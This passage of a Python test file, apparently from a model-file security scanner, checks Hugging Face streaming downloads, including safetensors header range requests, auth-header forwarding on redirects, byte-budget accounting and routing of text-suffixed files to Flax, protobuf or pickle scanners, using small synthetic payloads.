        ]

        results = list(
            download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=1024,
                scannable_extensions={".safetensors"},
                scannable_scanner_ids={"safetensors"},
                _include_scan_results=True,
            )
        )

        _path, _is_last, scan_result, _accounting = _unpack_internal_stream_item(results[0])
        assert scan_result.success is True
        assert scan_result.metadata["remote_final_host"] == "d111111abcdef8.cloudfront.net"
        assert mock_requests_get.call_args_list[0].kwargs["headers"]["Authorization"] == "Bearer hf_secret"
        assert mock_requests_get.call_args_list[1].kwargs["headers"].get("Authorization") is None
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.hf_hub_download")
    @patch("huggingface_hub.utils.build_hf_headers", return_value={"Authorization": "Bearer hf_secret"})
    @patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/source")
    @patch("requests.get")
    def test_download_model_streaming_rejects_nonstandard_port_before_forwarding_auth(
        self,
        mock_requests_get: MagicMock,
        _mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
        mock_hf_hub_download: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        filename = "model.safetensors"
        frame, _header_len = _make_safetensors_frame(
            {"tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}},
            b"\x00",
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: len(frame)}, _HF_TEST_REVISION),
        )
        mock_requests_get.return_value = _FakeRangeResponse(
            b"",
            headers={"Location": "https://huggingface.co:444/blob"},
            status_code=302,
        )

        results = list(
            download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=1024,
                scannable_scanner_ids={"safetensors"},
                _include_scan_results=True,
            )
        )

        _path, _is_last, scan_result = cast(tuple[Path, bool, Any], results[0])
        assert scan_result.success is False
        assert "remote_safetensors_header_range_failed" in scan_result.metadata["scan_outcome_reasons"]
        assert mock_requests_get.call_count == 1
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.hf_hub_download")
    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/test/model/resolve/rev/model.safetensors")
    @patch("requests.get")
    @pytest.mark.parametrize(
        ("budget_adjustment", "expected_bytes", "expected_request_count", "expected_reason"),
        [
            (0, None, 2, "safetensors_header_validation_failed"),
            (-1, 8, 1, "remote_safetensors_header_max_size_exceeded"),
        ],
        ids=["exact-budget", "one-byte-under"],
    )
    def test_download_model_streaming_charges_malformed_header_bytes(
        self,
        mock_requests_get: MagicMock,
        _mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
        mock_hf_hub_download: MagicMock,
        budget_adjustment: int,
        expected_bytes: int | None,
        expected_request_count: int,
        expected_reason: str,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Malformed remote headers still consume their exact transferred-byte budget."""
        filename = "malformed.safetensors"
        header = b'{"tensor":'
        frame = struct.pack("<Q", len(header)) + header
        full_transfer_bytes = len(frame) + 8
        max_size = full_transfer_bytes + budget_adjustment
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: len(frame)}, _HF_TEST_REVISION),
        )

        def range_response(url: str, *, headers: dict[str, str], **_kwargs: object) -> _FakeRangeResponse:
            start_text, end_text = headers["Range"].removeprefix("bytes=").split("-", 1)
            start, end = int(start_text), min(int(end_text), len(frame) - 1)
            return _strict_range_response(frame[start : end + 1], len(frame), start_offset=start, url=url)

        _mock_build_headers.side_effect = lambda *, token=None, headers=None: headers or {}
        mock_requests_get.side_effect = range_response
        results = list(
            download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=max_size,
                scannable_extensions={".safetensors"},
                scannable_scanner_ids={"safetensors"},
                _include_scan_results=True,
            )
        )

        _path, _is_last, scan_result = cast(tuple[Path, bool, Any], results[0])
        charged_bytes = full_transfer_bytes if expected_bytes is None else expected_bytes
        assert scan_result.success is False
        assert scan_result.metadata["remote_bytes_transferred"] == charged_bytes
        assert expected_reason in scan_result.metadata["scan_outcome_reasons"]
        assert mock_requests_get.call_count == expected_request_count
        mock_hf_hub_download.assert_not_called()

    @pytest.mark.parametrize(
        "reported_remote_bytes",
        [16, None, True, -1],
        ids=["valid", "missing", "boolean", "negative"],
    )
    def test_download_model_streaming_charges_failed_header_metadata_across_files(
        self,
        reported_remote_bytes: object,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A zero-byte failed result cannot reset the shared budget before the next file."""
        filenames = ["first.safetensors", "second.safetensors"]
        max_size = 16
        remaining_budgets: list[int | None] = []
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: (filenames, _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: (dict.fromkeys(filenames, 128), _HF_TEST_REVISION),
        )

        def failed_scan(
            _repo_id: str,
            filename: str,
            _revision: str,
            *,
            max_transferred_bytes: int | None,
            **_kwargs: object,
        ) -> Any:
            remaining_budgets.append(max_transferred_bytes)
            result = _fake_remote_safetensors_scan(filename, 128)
            result.bytes_scanned = 3 if filename == filenames[0] else 0
            if filename == filenames[0]:
                if reported_remote_bytes is None:
                    result.metadata.pop("remote_bytes_transferred")
                else:
                    result.metadata["remote_bytes_transferred"] = reported_remote_bytes
            else:
                result.metadata["remote_bytes_transferred"] = 0
            result.finish(success=False)
            return result

        with (
            patch(
                "modelaudit.utils.sources.huggingface._scan_remote_huggingface_safetensors_header",
                side_effect=failed_scan,
            ),
            patch("huggingface_hub.hf_hub_download") as mock_download,
        ):
            stream = download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=max_size,
                scannable_extensions={".safetensors"},
                scannable_scanner_ids={"safetensors"},
                _include_scan_results=True,
            )
            if reported_remote_bytes == 16 and not isinstance(reported_remote_bytes, bool):
                results = cast(list[tuple[Path, bool, Any]], list(stream))
            else:
                with pytest.raises(Exception, match="invalid byte accounting"):
                    list(stream)
                results = []

        if results:
            assert len(results) == 2
            assert remaining_budgets == [16, 0]
            assert results[0][2].bytes_scanned == 3
        else:
            assert remaining_budgets == [16]
        mock_download.assert_not_called()

    @patch("huggingface_hub.hf_hub_download")
    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/test/model/resolve/rev/model.safetensors")
    @patch("requests.get")
    def test_download_model_streaming_stops_safetensors_header_at_remaining_max_size(
        self,
        mock_requests_get: MagicMock,
        _mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
        mock_hf_hub_download: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A header larger than the remaining max-size budget must not be fetched."""
        filename = "model-00001-of-00001.safetensors"
        frame, _header_len = _make_safetensors_frame(
            {"tensor": {"dtype": "U8", "shape": [64], "data_offsets": [0, 64]}},
            b"\x00" * 64,
        )
        declared_size = len(frame)
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: declared_size}, _HF_TEST_REVISION),
        )
        _mock_build_headers.side_effect = lambda *, token=None, headers=None: headers or {}
        mock_requests_get.return_value = _FakeRangeResponse(
            frame[:8],
            headers={
                "Content-Range": f"bytes 0-7/{declared_size}",
                "Content-Length": "8",
                "ETag": '"stable"',
            },
            status_code=206,
        )

        results = list(
            download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=16,
                scannable_extensions={".safetensors"},
                scannable_scanner_ids={"safetensors"},
                _include_scan_results=True,
            )
        )

        _path, _is_last, scan_result = cast(tuple[Path, bool, Any], results[0])
        assert scan_result.success is False
        assert scan_result.metadata["remote_bytes_transferred"] == 8
        assert "remote_safetensors_header_max_size_exceeded" in scan_result.metadata["scan_outcome_reasons"]
        assert mock_requests_get.call_count == 1
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.hf_hub_download")
    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/test/model/resolve/rev/model.safetensors")
    @patch("requests.get")
    def test_download_model_streaming_retries_transient_safetensors_range_errors(
        self,
        mock_requests_get: MagicMock,
        _mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
        mock_hf_hub_download: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Retryable transport failures should not force an incomplete remote header scan."""
        import requests

        filename = "model-00001-of-00001.safetensors"
        frame, header_len = _make_safetensors_frame(
            {"tensor": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]}},
            b"\x00" * 4,
        )
        declared_size = len(frame)
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: declared_size}, _HF_TEST_REVISION),
        )
        _mock_build_headers.side_effect = lambda *, token=None, headers=None: headers or {}
        mock_requests_get.side_effect = [
            requests.exceptions.Timeout("temporary storage timeout"),
            _FakeRangeResponse(
                frame[:8],
                headers={
                    "Content-Range": f"bytes 0-7/{declared_size}",
                    "Content-Length": "8",
                    "ETag": '"stable"',
                },
                status_code=206,
            ),
            _FakeRangeResponse(
                frame[: 8 + header_len],
                headers={
                    "Content-Range": f"bytes 0-{7 + header_len}/{declared_size}",
                    "Content-Length": str(8 + header_len),
                    "ETag": '"stable"',
                },
                status_code=206,
            ),
        ]

        results = list(
            download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=1024,
                scannable_extensions={".safetensors"},
                scannable_scanner_ids={"safetensors"},
                _include_scan_results=True,
            )
        )

        _path, _is_last, scan_result = cast(tuple[Path, bool, Any], results[0])
        assert scan_result.success is True
        assert scan_result.metadata["range_attempts"] == 2
        assert scan_result.metadata["remote_bytes_transferred"] == 16 + header_len
        assert [call.kwargs["headers"]["Range"] for call in mock_requests_get.call_args_list] == [
            "bytes=0-7",
            "bytes=0-7",
            f"bytes=0-{7 + header_len}",
        ]
        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface.time.sleep", return_value=None)
    @patch("huggingface_hub.hf_hub_download")
    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/test/model/resolve/rev/model.safetensors")
    @patch("requests.get")
    def test_download_model_streaming_charges_partial_retry_bytes(
        self,
        mock_requests_get: MagicMock,
        _mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
        mock_hf_hub_download: MagicMock,
        _mock_sleep: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Bytes received before a retryable body failure must remain charged to max-size."""
        import requests

        class PartialBodyFailure(_FakeRangeResponse):
            def iter_content(self, chunk_size: int) -> Iterator[bytes]:
                yield self.payload[:chunk_size]
                raise requests.exceptions.ChunkedEncodingError("partial body")

        filename = "model-00001-of-00001.safetensors"
        frame, header_len = _make_safetensors_frame(
            {"tensor": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]}},
            b"\x00" * 4,
        )
        declared_size = len(frame)
        full_header_bytes = 8 + header_len
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: declared_size}, _HF_TEST_REVISION),
        )
        partial_response = PartialBodyFailure(
            frame[:10],
            headers={
                "Content-Range": f"bytes 0-{full_header_bytes - 1}/{declared_size}",
                "Content-Length": str(full_header_bytes),
                "ETag": '"stable"',
            },
            status_code=206,
        )
        mock_requests_get.side_effect = [
            _strict_range_response(frame[:8], declared_size),
            partial_response,
            _strict_range_response(frame[:8], declared_size),
        ]

        results = list(
            download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=8 + full_header_bytes,
                scannable_extensions={".safetensors"},
                scannable_scanner_ids={"safetensors"},
                _include_scan_results=True,
            )
        )

        _path, _is_last, scan_result = cast(tuple[Path, bool, Any], results[0])
        assert scan_result.success is False
        assert scan_result.metadata["remote_bytes_transferred"] == 26
        assert "remote_safetensors_header_max_size_exceeded" in scan_result.metadata["scan_outcome_reasons"]
        assert mock_requests_get.call_count == 3
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.hf_hub_download")
    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/test/model/resolve/rev/model.safetensors")
    @patch("requests.get")
    def test_download_model_streaming_rejects_changed_overlapping_header_prefix(
        self,
        mock_requests_get: MagicMock,
        _mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
        mock_hf_hub_download: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """The full header range must contain the same framing bytes as the length preflight."""
        filename = "model.safetensors"
        first_frame, _first_header_len = _make_safetensors_frame(
            {"long_name": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]}},
            b"\x00" * 4,
        )
        second_frame, second_header_len = _make_safetensors_frame(
            {"short": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]}},
            b"\x00" * 4,
        )
        declared_size = len(first_frame)
        second_payload = second_frame[: 8 + second_header_len]
        second_payload += b" " * ((8 + struct.unpack("<Q", first_frame[:8])[0]) - len(second_payload))
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: declared_size}, _HF_TEST_REVISION),
        )
        mock_requests_get.side_effect = [
            _strict_range_response(first_frame[:8], declared_size),
            _strict_range_response(second_payload, declared_size),
        ]

        results = list(
            download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=4096,
                scannable_scanner_ids={"safetensors"},
                _include_scan_results=True,
            )
        )

        _path, _is_last, scan_result = cast(tuple[Path, bool, Any], results[0])
        assert scan_result.success is False
        assert "remote_safetensors_header_range_failed" in scan_result.metadata["scan_outcome_reasons"]
        assert mock_requests_get.call_count == 2
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.hf_hub_download")
    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/test/model/resolve/rev/model.safetensors")
    @patch("requests.get")
    def test_download_model_streaming_ignored_safetensors_range_is_inconclusive(
        self,
        mock_requests_get: MagicMock,
        _mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
        mock_hf_hub_download: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Ignored Range responses must not be trusted as complete header coverage."""
        filename = "model-00001-of-00001.safetensors"
        frame, _header_len = _make_safetensors_frame(
            {"tensor": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]}},
            b"\x00" * 4,
        )
        declared_size = len(frame)
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: declared_size}, _HF_TEST_REVISION),
        )
        mock_requests_get.return_value = _FakeRangeResponse(
            frame,
            headers={"Content-Length": str(declared_size), "ETag": '"stable"'},
            status_code=200,
        )

        results = list(
            download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=1024,
                scannable_extensions={".safetensors"},
                scannable_scanner_ids={"safetensors"},
                _include_scan_results=True,
            )
        )

        _path, _is_last, scan_result = cast(tuple[Path, bool, Any], results[0])
        assert scan_result.success is False
        assert scan_result.metadata["scan_outcome"] == "inconclusive"
        assert scan_result.metadata["operational_error"] is True
        assert scan_result.metadata["remote_bytes_transferred"] == 0
        assert "remote_safetensors_header_range_failed" in scan_result.metadata["scan_outcome_reasons"]
        assert mock_requests_get.call_count == 1
        mock_hf_hub_download.assert_not_called()

    @pytest.mark.parametrize(
        ("filename", "payload", "scannable_extensions", "scannable_scanner_ids", "expected_files"),
        [
            (
                "weights.txt",
                b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03",
                {".msgpack", ".flax", ".orbax", ".jax"},
                {"flax_msgpack"},
                ["known.msgpack", "weights.txt"],
            ),
            (
                "weights.conf",
                b":" + _make_printable_utf8_messagepack_candidate(),
                {".msgpack", ".flax", ".orbax", ".jax"},
                {"flax_msgpack"},
                ["known.msgpack", "weights.conf"],
            ),
            (
                "weights-colon-newline.conf",
                b":\n" + _make_printable_utf8_messagepack_candidate(),
                {".msgpack", ".flax", ".orbax", ".jax"},
                {"flax_msgpack"},
                ["known.msgpack", "weights-colon-newline.conf"],
            ),
            (
                "weights-colon-space.conf",
                b": a\n" + _make_printable_utf8_messagepack_candidate(),
                {".msgpack", ".flax", ".orbax", ".jax"},
                {"flax_msgpack"},
                ["known.msgpack", "weights-colon-space.conf"],
            ),
            (
                "weights-key-colon.txt",
                b"a:\n" + _make_printable_utf8_messagepack_candidate(),
                {".msgpack", ".flax", ".orbax", ".jax"},
                {"flax_msgpack"},
                ["known.msgpack", "weights-key-colon.txt"],
            ),
            (
                "weights-key-lines.conf",
                b"key:\n" + _make_line_broken_printable_utf8_messagepack_candidate(),
                {".msgpack", ".flax", ".orbax", ".jax"},
                {"flax_msgpack"},
                ["known.msgpack", "weights-key-lines.conf"],
            ),
            (
                "candidate.txt",
                (b"B" + bytes([len(("é" * 60).encode("utf-8") + b" x:12")]) + ("é" * 60).encode("utf-8") + b" x:12")
                * 4097,
                {".onnx"},
                {"onnx"},
                ["model.onnx", "candidate.txt"],
            ),
            (
                "oversized-candidate.txt",
                b"\x12\xff\xff\xff\xff\xff" + (b"\x00" * ((1024 * 1024) + 1)),
                {".onnx"},
                {"onnx"},
                ["model.onnx", "oversized-candidate.txt"],
            ),
        ],
        ids=[
            "flax-msgpack-text-suffix",
            "flax-msgpack-colon-inline-text-suffix",
            "flax-msgpack-structure-prefixed-text-suffix",
            "flax-msgpack-colon-space-text-suffix",
            "flax-msgpack-key-colon-text-suffix",
            "flax-msgpack-key-line-broken-text-suffix",
            "protobuf-candidate-text-suffix",
            "protobuf-oversized-candidate-text-suffix",
        ],
    )
    @patch("requests.get")
    def test_select_streamable_text_suffix_retains_binary_routes(
        self,
        mock_requests_get: MagicMock,
        filename: str,
        payload: bytes,
        scannable_extensions: set[str],
        scannable_scanner_ids: set[str],
        expected_files: list[str],
    ) -> None:
        """Text-owner suffix handling must not suppress binary model candidates."""
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        repo_files = [expected_files[0], filename]
        selected_files = _select_streamable_hf_files(
            "test/model",
            repo_files,
            _HF_TEST_REVISION,
            scannable_extensions=scannable_extensions,
            scannable_scanner_ids=scannable_scanner_ids,
        )

        assert selected_files.filenames == expected_files

    @patch("requests.get")
    def test_select_streamable_text_suffix_safetensors_near_match_preserves_flax_route(
        self,
        mock_requests_get: MagicMock,
    ) -> None:
        """SafeTensors near-matches must not hide a delayed Flax route for text suffixes."""
        header_len = SAFETENSORS_ROUTING_HEADER_PARSE_BYTES + 1
        disclosed_size = 8 + header_len
        flax_root = b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03"
        root_offset = _HF_CONTENT_SNIFF_BYTES + 817
        payload = struct.pack("<Q", header_len) + b"{" + (b"\x00" * (root_offset - 9)) + flax_root
        assert root_offset + len(flax_root) < FLAX_MSGPACK_STRUCTURE_READ_BYTES
        payload = payload.ljust(FLAX_MSGPACK_STRUCTURE_READ_BYTES + 1, b"\x00")

        def get_side_effect(_url: str, *, headers: dict[str, str], **_kwargs: object) -> _FakeRangeResponse:
            range_header = headers["Range"]
            max_bytes = int(range_header.rsplit("-", 1)[1]) + 1
            probe = payload[:max_bytes]
            return _FakeRangeResponse(
                probe,
                headers={"Content-Range": f"bytes 0-{len(probe) - 1}/{disclosed_size}"},
                status_code=206,
            )

        mock_requests_get.side_effect = get_side_effect

        selected_files = _select_streamable_hf_files(
            "test/model",
            ["known.msgpack", "weights.conf"],
            _HF_TEST_REVISION,
            scannable_extensions={".msgpack", ".flax", ".orbax", ".jax"},
            scannable_scanner_ids={"flax_msgpack"},
        )

        assert selected_files.filenames == ["known.msgpack", "weights.conf"]

    @patch("requests.get")
    def test_select_streamable_text_suffix_safetensors_inconclusive_flax_preserves_safetensors(
        self,
        mock_requests_get: MagicMock,
    ) -> None:
        """A real SafeTensors frame must not be overridden by only inconclusive Flax probing."""
        tensor = b"\xdb\xff\xff\xff\xff" + (b"x" * (FLAX_MSGPACK_STRUCTURE_READ_BYTES + 16))
        header = json.dumps(
            {"tensor": {"dtype": "U8", "shape": [len(tensor)], "data_offsets": [0, len(tensor)]}},
            separators=(",", ":"),
        ).encode("utf-8")
        payload = struct.pack("<Q", len(header)) + header + tensor
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        selected_files = _select_streamable_hf_files(
            "test/model",
            ["known.safetensors", "weights.conf"],
            _HF_TEST_REVISION,
            scannable_extensions={".safetensors"},
            scannable_scanner_ids={"safetensors"},
        )

        assert selected_files.filenames == ["known.safetensors", "weights.conf"]

    @patch("requests.get")
    def test_select_streamable_safetensors_suffix_keeps_flax_like_tensor_bytes_as_safetensors(
        self,
        mock_requests_get: MagicMock,
    ) -> None:
        """Only text-suffix SafeTensors near-matches may be promoted to Flax."""
        tensor = b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03"
        header = json.dumps(
            {"tensor": {"dtype": "U8", "shape": [len(tensor)], "data_offsets": [0, len(tensor)]}},
            separators=(",", ":"),
        ).encode("utf-8")
        payload = struct.pack("<Q", len(header)) + header + tensor
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        selected_files = _select_streamable_hf_files(
            "test/model",
            ["known.msgpack", "weights.safetensors"],
            _HF_TEST_REVISION,
            scannable_extensions={".msgpack", ".flax", ".orbax", ".jax"},
            scannable_scanner_ids={"flax_msgpack"},
        )

        assert selected_files.filenames == ["known.msgpack"]

    @pytest.mark.parametrize(
        ("hidden_payload", "expected_filenames"),
        [
            (
                b"\x80\x04\x81\xa6params\x81\xa1w\x93\x01\x02\x03",
                ["known.msgpack", "hidden.payload"],
            ),
            (
                b"(d.\x81\xa6params\x81\xa1w\x93\x01\x02\x03",
                ["known.msgpack", "hidden.payload"],
            ),
            (pickle.dumps({"ordinary": "pickle"}, protocol=4), ["known.msgpack"]),
            (pickle.dumps({"ordinary": "pickle"}, protocol=0), ["known.msgpack"]),
        ],
        ids=[
            "flax-binary-pickle-overlap",
            "flax-proto0-pickle-overlap",
            "ordinary-binary-pickle",
            "ordinary-proto0-pickle",
        ],
    )
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["known.msgpack", "hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_selected_flax_preserves_pickle_overlap(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        hidden_payload: bytes,
        expected_filenames: list[str],
        tmp_path: Path,
    ) -> None:
        """Remote Flax selection must preserve structural overlap without widening to pickle."""

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / filename
            path.write_bytes(hidden_payload if filename == "hidden.payload" else b"\x81\xa6params\x80")
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect
        mock_requests_get.return_value = _FakeRangeResponse(hidden_payload)

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions={".msgpack", ".flax", ".orbax", ".jax"},
                scannable_scanner_ids={"flax_msgpack"},
            )
        )

        assert [item[0].name for item in results] == expected_filenames
        assert results[-1][1] is True

    @patch("requests.get")
    def test_select_streamable_flax_excludes_large_text_owner_merges(
        self,
        mock_requests_get: MagicMock,
    ) -> None:
        """A complete large tokenizer text file must not be promoted to Flax."""
        payload = ("#version: 0.2\n" + "e n\n" * 600_000).encode("utf-8")
        mock_requests_get.side_effect = _fake_range_responder(payload)

        selected_files = _select_streamable_hf_files(
            "test/model",
            ["known.msgpack", "merges.txt"],
            _HF_TEST_REVISION,
            scannable_extensions={".msgpack", ".flax", ".orbax", ".jax"},
            scannable_scanner_ids={"flax_msgpack"},
        )

        assert selected_files.filenames == ["known.msgpack"]

    @patch("requests.get")
    def test_select_streamable_text_owner_prefix_preserves_embedded_flax_route(
        self,
        mock_requests_get: MagicMock,
    ) -> None:
        """A text-looking remote prefix must not skip later bounded binary model bytes."""
        text_prefix = ("#version: 0.2\n" + "e n\n" * 3_000).encode("utf-8")[:_HF_CONTENT_SNIFF_BYTES]
        payload = text_prefix + b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03"
        mock_requests_get.side_effect = _fake_range_responder(payload)

        selected_files = _select_streamable_hf_files(
            "test/model",
            ["known.msgpack", "weights.txt"],
            _HF_TEST_REVISION,
            scannable_extensions={".msgpack", ".flax", ".orbax", ".jax"},
            scannable_scanner_ids={"flax_msgpack"},
        )

        assert selected_files.filenames == ["known.msgpack", "weights.txt"]

    @patch("requests.get")
    def test_select_streamable_text_owner_prefix_preserves_mid_window_flax_route(
        self,
        mock_requests_get: MagicMock,
    ) -> None:
        """The post-prefix guard must cover the Flax structure window, not only one sniff chunk."""
        text_prefix = ("#version: 0.2\n" + "e n\n" * 3_000).encode("utf-8")[:_HF_CONTENT_SNIFF_BYTES]
        payload = (
            text_prefix + (b" " * ((_HF_CONTENT_SNIFF_BYTES * 2) + 100)) + b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03"
        )
        mock_requests_get.side_effect = _fake_range_responder(payload)

        selected_files = _select_streamable_hf_files(
            "test/model",
            ["known.msgpack", "weights.txt"],
            _HF_TEST_REVISION,
            scannable_extensions={".msgpack", ".flax", ".orbax", ".jax"},
            scannable_scanner_ids={"flax_msgpack"},
        )

        assert selected_files.filenames == ["known.msgpack", "weights.txt"]

    @patch("requests.get")
    def test_select_streamable_text_owner_prefix_preserves_embedded_protobuf_route(
        self,
        mock_requests_get: MagicMock,
    ) -> None:
        """Ordinary text prefixes must not hide later protobuf model-candidate bytes."""
        text_prefix = ("#version: 0.2\n" + "e n\n" * 3_000).encode("utf-8")[:_HF_CONTENT_SNIFF_BYTES]
        proto_value = ("é" * 60).encode("utf-8") + b" x:12"
        payload = text_prefix + b"B" + bytes([len(proto_value)]) + proto_value
        mock_requests_get.side_effect = _fake_range_responder(payload)

        selected_files = _select_streamable_hf_files(
            "test/model",
            ["model.onnx", "candidate.txt"],
            _HF_TEST_REVISION,
            scannable_extensions={".onnx"},
            scannable_scanner_ids={"onnx"},
        )

        assert selected_files.filenames == ["model.onnx", "candidate.txt"]

    @patch("modelaudit.utils.sources.huggingface._HF_CONTENT_SNIFF_MAX_TOTAL_BYTES", 4 * 1024 * 1024)
    @patch("requests.get")
    def test_select_streamable_text_owner_uses_known_size_for_complete_probe_budget(
        self,
        mock_requests_get: MagicMock,
    ) -> None:
        """Known-small tokenizer text should not reserve the full text-owner ceiling."""
        payload = ("#version: 0.2\n" + "e n\n" * 3_000).encode("utf-8")
        requested_ranges: list[tuple[int, int]] = []

        def get_side_effect(_url: str, *, headers: dict[str, str], **_kwargs: object) -> _FakeRangeResponse:
            range_header = headers["Range"]
            start_text, end_text = range_header.removeprefix("bytes=").split("-", 1)
            requested_start = int(start_text)
            requested_end = int(end_text)
            requested_ranges.append((requested_start, requested_end))
            response_end = min(requested_end, len(payload) - 1)
            return _fake_content_range_response(payload, requested_start, response_end)

        mock_requests_get.side_effect = get_side_effect

        selected_files = _select_streamable_hf_files(
            "test/model",
            ["known.msgpack", "a.txt", "b.txt", "c.txt"],
            _HF_TEST_REVISION,
            scannable_extensions={".msgpack", ".flax", ".orbax", ".jax"},
            scannable_scanner_ids={"flax_msgpack"},
        )

        assert selected_files.filenames == ["known.msgpack"]
        assert requested_ranges
        assert all((end - start + 1) <= FLAX_MSGPACK_STRUCTURE_READ_BYTES for start, end in requested_ranges)
        assert (0, len(payload) - 1) not in requested_ranges

    @patch("requests.get")
    def test_select_streamable_protobuf_excludes_non_ascii_bpe_text_owner(
        self,
        mock_requests_get: MagicMock,
    ) -> None:
        """BPE merge text with non-ASCII tokens must not become a protobuf candidate."""
        payload = ("#version: 0.2\n" + "Ġ hello\n" * 300_000).encode("utf-8")
        mock_requests_get.side_effect = _fake_range_responder(payload)

        selected_files = _select_streamable_hf_files(
            "test/model",
            ["model.onnx", "merges.txt"],
